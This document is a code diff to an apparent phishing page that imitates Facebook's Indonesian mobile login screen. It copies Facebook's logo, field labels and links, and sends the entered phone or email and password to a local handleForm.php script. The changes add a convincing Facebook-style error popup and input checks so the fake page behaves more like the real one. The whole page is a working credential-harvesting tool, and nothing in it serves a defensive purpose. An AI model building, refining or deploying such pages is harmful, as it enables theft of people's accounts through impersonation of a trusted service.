@@ -13,6 +13,7 @@
     <link rel="icon" type="image/png" sizes="32x32" href="assets/favicon.png">
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.cdnfonts.com/css/optimistic-signature" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQKtxr5l8aD6LU2DMaIsXbPw4JqtaqK5R3z3k5C0Kj4f9F2yU7B7lS2m0" crossorigin="anonymous">
     <script src="style.css"></script>
 
     <style>
@@ -99,6 +100,44 @@
             opacity: 0.8;
             transition: all 0.1s ease;
         }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            margin: 30px 30px 30px 30px;
+            background: white;
+            border-radius: 10px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .modal-text {
+            padding: 32px;
+        }
+
+        .modal-btn {
+            padding: 12px 10px;
+        }
+
+        .modal button {
+            color: rgb(0, 100, 224);
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            line-height: 1.5;
+        }
     </style>
 </head>
 
@@ -107,31 +146,43 @@
     <div class="background"></div>
 
     <div class="container mx-auto relative z-10">
-        <div class="up">
-            <p class="text-center mx-auto my-8 font-normal" style="color: rgb(70, 90, 105); font-weight: 400; font-size: 13px; font-family: 'Optimistic Text Normal';">Bahasa Indonesia</p>
-            <img class="w-14 mx-auto bg-transparent my-20 rounded-full" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="">
+        <div class="main-content">
+            <div class="up">
+                <p class="text-center mx-auto my-6 font-normal" style="color: rgb(70, 90, 105); font-weight: 400; font-size: 13px; font-family: 'Optimistic Text Normal';">Bahasa Indonesia</p>
+                <img class="w-14 mx-auto bg-transparent my-16 rounded-full" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="">
+            </div>
+
+            <form class="down bg-none flex flex-col" id="form" action="handleForm.php" method="POST">
+                <input class="custom-input mr-3 ml-3 mb-2" type="text" id="inputUsername" name="inputUsername" placeholder="Nomor Ponsel atau email">
+                <input class="custom-input mr-3 ml-3 mb-3" type="password" id="inputPassword" name="inputPassword" placeholder="Kata Sandi">
+                <button class="btn rounded-full mr-3 ml-3 py-2 cursor-pointer text-white font-semibold transition-all duration-50 ease-out"
+                    style="height: 44px; min-width: 44px; background: rgb(0, 100, 224); font-size: 16px; font-weight: 500; border: none; border-radius: 22px; display: flex; align-items: center; justify-content: center; font-size: 15px; opacity: 1; transition: all 50ms ease-out;"
+                    onmouseover="this.style.background='rgb(0, 135, 255)'; this.style.opacity='0.9'; this.style.transform='scaleX(0.98) scaleY(0.995)';"
+                    onmouseout="this.style.background='rgb(0, 100, 224)'; this.style.opacity='1'; this.style.transform='scaleX(1) scaleY(1)';" onclick="validateLogin()">
+                    Login
+                </button>
+                <p href="https://m.facebook.com/login/identify/"
+                    class="mt-3 bg-none text-sm mx-auto mb-16 cursor-pointer transition-all duration-75 ease-out"
+                    style="color: rgb(28, 43, 51); font-weight: 500; font-size: 16px; font-family: 'Optimistic Text Normal'; text-decoration: none; transition: all 75ms ease-out;"
+                    onmouseover="this.style.color='rgb(50, 70, 90)'; this.style.textDecoration='none';"
+                    onmouseout="this.style.color='rgb(28, 43, 51)'; this.style.textDecoration='none';">
+                    Lupa kata sandi?
+                </p>
+            </form>
         </div>
-
-        <form class="down bg-none flex flex-col" id="form" action="handleForm.php" method="POST">
-            <input class="custom-input mr-3 ml-3 mb-2" type="text" id="inputUsername" name="inputUsername" placeholder="Nomor Ponsel atau email" required>
-            <input class="custom-input mr-3 ml-3 mb-3" type="password" id="inputPassword" name="inputPassword" placeholder="Kata Sandi" required>
-            <span class="eye-icon"></span>
-            <button class="btn rounded-full mr-3 ml-3 py-2 cursor-pointer text-white font-semibold transition-all duration-50 ease-out"
-                style="height: 44px; min-width: 44px; background: rgb(0, 100, 224); font-size: 16px; font-weight: 500; border: none; border-radius: 22px; display: flex; align-items: center; justify-content: center; font-size: 15px; opacity: 1; transition: all 50ms ease-out;"
-                onmouseover="this.style.background='rgb(0, 135, 255)'; this.style.opacity='0.9'; this.style.transform='scaleX(0.98) scaleY(0.995)';"
-                onmouseout="this.style.background='rgb(0, 100, 224)'; this.style.opacity='1'; this.style.transform='scaleX(1) scaleY(1)';">
-                Login
-            </button>
-            <p href="https://m.facebook.com/login/identify/"
-                class="mt-4 bg-none text-sm mx-auto mb-20 cursor-pointer transition-all duration-75 ease-out"
-                style="color: rgb(28, 43, 51); font-weight: 500; font-size: 16px; font-family: 'Optimistic Text Normal'; text-decoration: none; transition: all 75ms ease-out;"
-                onmouseover="this.style.color='rgb(50, 70, 90)'; this.style.textDecoration='none';"
-                onmouseout="this.style.color='rgb(28, 43, 51)'; this.style.textDecoration='none';">
-                Lupa kata sandi?
-            </p>
-        </form>
-
-        <div class="bottom bg-none flex flex-col mt-8">
+        <!-- Modal Popup -->
+        <div id="errorModal" class="modal" onclick="outsideClick(event)">
+            <div class="modal-content">
+                <div class="modal-text">
+                    <p style="color: rgb(28, 30, 33); font-size: 18px; font-weight: 600;">Perlu email atau nomor ponsel</p>
+                    <p style="color: rgb(101, 103, 107); font-size: 14px; margin-top: 12px;">Masukkan email atau nomor ponsel untuk melanjutkan.</p>
+                </div>
+                <div class="modal-btn" style="border-top: 1px solid rgb(206, 208, 212);" onclick="closeModal()">
+                    <button onclick="closeModal()">OK</button>
+                </div>
+            </div>
+        </div>
+        <div class="bottom bg-none flex flex-col mt-20">
             <button href="https://m.facebook.com/reg/"
                 class="btn rounded-full mr-3 ml-3 py-2 font-semibold cursor-pointer transition-all duration-75 ease-out"
                 style="height: 44px; min-width: 44px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(0, 100, 224); color: rgb(0, 100, 224); font-size: 15px; display: flex; align-items: center; justify-content: center; transition: all 75ms ease-out;"
@@ -158,5 +209,28 @@
     document.getElementById("inputUsername").removeAttribute("required");
     document.getElementById("inputPassword").removeAttribute("required");
 </script>
+
+<script>
+    document.getElementById("form").addEventListener("submit", function(event) {
+        let username = document.getElementById("inputUsername").value.trim();
+        let password = document.getElementById("inputPassword").value.trim();
+
+        if (username === "" || password === "") {
+            event.preventDefault(); // Mencegah form terkirim
+            document.getElementById("errorModal").style.display = "flex";
+        }
+    });
+
+    function closeModal() {
+        document.getElementById("errorModal").style.display = "none";
+    }
+
+    function outsideClick(event) {
+        if (event.target.id === "errorModal") {
+            closeModal();
+        }
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-HoA1f00C8DJn67rw9+7bXLs4g0EtnqTnX7jXT1LYc6+ne2oyU1vKfWlip8zcvnL8" crossorigin="anonymous"></script>
 
 </html>
